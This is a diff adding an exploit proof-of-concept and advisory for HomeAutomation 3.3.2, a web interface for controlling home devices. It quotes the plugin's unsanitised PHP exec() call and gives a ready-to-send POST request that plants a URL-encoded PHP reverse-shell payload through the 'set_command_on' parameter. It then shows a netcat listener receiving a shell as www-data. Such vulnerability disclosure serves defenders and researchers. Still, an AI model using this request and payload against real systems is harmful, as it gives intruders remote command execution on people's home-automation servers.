@@ -1,0 +1,96 @@
+# Exploit: HomeAutomation 3.3.2 - Remote Code Execution
+# Date: 2019-12-30
+# Author: LiquidWorm
+# Vendor: Tom Rosenback and Daniel Malmgren
+# Product web page: http://karpero.mine.nu/ha/
+# Affected version: 3.3.2
+# Tested on: Apache/2.4.41 (centos) OpenSSL/1.0.2k-fips
+# Advisory ID: ZSL-2019-5560
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5560.php
+
+HomeAutomation v3.3.2 CSRF Remote Command Execution (PHP Reverse Shell) PoC
+
+Vendor: Tom Rosenback and Daniel Malmgren
+Product web page: http://karpero.mine.nu/ha/
+Affected version: 3.3.2
+
+Summary: HomeAutomation is an open-source web interface and scheduling solution.
+It was initially made for use with the Telldus TellStick, but is now based on a
+plugin system and except for Tellstick it also comes with support for Crestron,
+OWFS and Z-Wave (using OpenZWave). It controls your devices (switches, dimmers,
+etc.) based on an advanced scheduling system, taking into account things like
+measurements from various sensors. With the houseplan view you can get a simple
+overview of the status of your devices at their location in your house.
+
+Desc: The application suffers from an authenticated OS command execution vulnerability
+using custom command v0.1 plugin. This can be exploited with CSRF vulnerability to
+execute arbitrary shell commands as the web user via the 'set_command_on' and 'set_command_off'
+POST parameters in '/system/systemplugins/customcommand/customcommand.plugin.php' by
+using an unsanitized PHP exec() function.
+
+===============================================================================
+/system/systemplugins/customcommand/customcommand.plugin.php:
+-------------------------------------------------------------
+
+77: 	function toggleDevices($devicesToToggle, $statuses) {
+78: 		$output = array();
+79: 		$command = "";
+80: 
+81: 		foreach($devicesToToggle as $device)
+82: 		{
+83: 			$status = $statuses[$device["id"]];
+84: 			if($status == 0) {
+85: 				$command = $this->getSettings("command_off");
+86: 			} else {
+87: 				$command = $this->getSettings("command_on");
+88: 			}
+89: 
+90: 			if(!empty($command)) {
+91: 				$command = replaceCustomStrings($command, $device, $statuses[$device["id"]]);
+92: 
+93: 				exec($command, $output);
+94: 
+95: 				SaveLog("Command: ".$command."\nOutput:\n".parseExecOutputToString($output));
+96: 			}
+97: 		}
+98: 
+99: 		return "";
+100: 	}
+===============================================================================
+
+Tested on: Apache/2.4.41 (centos) OpenSSL/1.0.2k-fips
+           Apache/2.4.29 (Ubuntu)
+           PHP/7.4.0RC4
+           PHP/7.3.11
+           PHP 7.2.24-0ubuntu0.18.04.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5560
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5560.php
+
+
+06.11.2019
+
+--
+
+
+POST /homeautomation_v3_3_2/?page=conf-systemplugins HTTP/1.1
+
+plugin=customcommand&action=savesettings&set_command_on=php+-r+%27%24sock%3Dfsockopen%28%22127.0.0.1%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27&set_command_off=&savesettings=Save
+
+-
+
+lqwrm@metalgear:/$ nc -lvp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from localhost 40724 received!
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ pwd
+/var/www/html/homeautomation_v3_3_2
+$ exit
+lqwrm@metalgear:/$
